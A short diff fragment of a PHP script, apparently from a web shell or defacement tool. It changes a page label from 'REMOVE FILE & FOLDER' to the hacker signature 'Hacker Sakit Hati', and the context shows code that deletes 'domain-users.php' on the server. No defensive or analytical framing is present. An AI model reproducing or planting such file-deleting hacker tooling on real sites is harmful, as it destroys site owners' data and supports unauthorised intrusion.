@@ -185,7 +185,7 @@ echo "<br>&#169; <font color='red'> ^_^ </font>";
 <?php
 
 echo '<style>body {background-color:#;color:#;}</style>
-REMOVE FILE & FOLDER<br>';
+Hacker Sakit Hati<br>';
 
 $result=unlink("domain-users.php");
 if($result){
